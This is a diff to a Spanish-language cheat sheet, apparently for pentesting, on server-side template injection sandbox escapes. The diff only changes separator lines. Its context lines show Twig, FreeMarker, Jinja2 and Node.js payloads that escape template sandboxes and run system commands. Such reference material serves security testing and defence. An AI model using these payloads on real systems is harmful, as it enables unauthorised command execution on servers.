@@ -16,7 +16,7 @@ linked:
 ---
 # SSTI - Sandbox Escape
 
-***
+---
 
 ## Jinja2 Sandbox Bypass
 
@@ -43,7 +43,7 @@ linked:
 4. Encadenar hasta __globals__ → os → popen → read.
 ```
 
-___
+---
 
 ## Twig Sandbox Bypass
 
@@ -59,7 +59,7 @@ ___
 | `{{_self.env.compileSource('{{system(\"id\")}}','test')}}` | Compile + ejecutar template inyectado | Twig env access. |
 ^ssti-sandbox-twig
 
-___
+---
 
 ## FreeMarker Security Manager Bypass
 
@@ -72,7 +72,7 @@ ___
 | `<#assign cls="freemarker.template.utility."+"Execute"?new()>` | Bypass `?new()` filter via string concat | Filter naive sobre literal. |
 ^ssti-sandbox-freemarker
 
-___
+---
 
 ## Filter Abuse para Escape
 
@@ -87,4 +87,4 @@ ___
 | `Function('return process')()` | Node.js context — bypass via Function constructor | JS engines basados en Node. |
 ^ssti-sandbox-filter-abuse
 
-***
+---
